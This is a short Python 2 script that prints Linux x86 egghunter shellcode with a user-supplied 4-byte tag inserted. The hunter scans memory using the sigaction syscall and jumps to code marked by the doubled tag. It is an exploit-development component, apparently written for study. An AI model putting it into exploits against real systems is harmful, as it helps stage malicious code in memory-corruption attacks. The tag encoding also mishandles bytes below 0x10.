import sys
import struct

if (len(sys.argv) < 2):
	print "4 bytes string required in second param"
else:
	egghunter = "\\x31\\xc9\\xeb\\x05\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\\xb8"
	for i in range(0,4):
		egghunter += "\\x"+hex(ord(sys.argv[1][3-i])).replace('0x',"")

	egghunter += "\\x89\\xcf\\xaf\\x75\\xec\\xaf\\x75\\xe9\\xff\\xe7"
	print egghunter
